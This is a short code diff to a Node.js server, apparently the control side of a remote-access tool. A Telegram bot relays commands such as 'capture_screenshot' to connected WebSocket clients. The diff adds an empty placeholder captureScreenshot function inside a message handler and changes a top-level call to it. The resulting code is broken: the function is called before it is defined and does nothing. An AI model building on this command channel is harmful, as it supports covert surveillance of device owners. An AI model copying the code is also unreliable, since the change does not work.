@@ -1,5 +1,5 @@
 const express = require('express');
-const screenshotBuffer = captureScreenshot('screen');
+const screenshotBuffer = captureScreenshot();
 const webSocket = require('ws');
 const http = require('http')
 const telegramBot = require('node-telegram-bot-api')
@@ -159,6 +159,12 @@ appBot.on('message', (message) => {
                 }
             )
         }
+        // Define the captureScreenshot function
+function captureScreenshot() {
+    // Your implementation to capture a screenshot and return it as a buffer
+    // This function should return the screenshot as a buffer
+}
+
         if (commend == 'capture_screenshot') {
             const screenshotBuffer = captureScreenshot()
     appSocket.clients.forEach(function each(ws) {
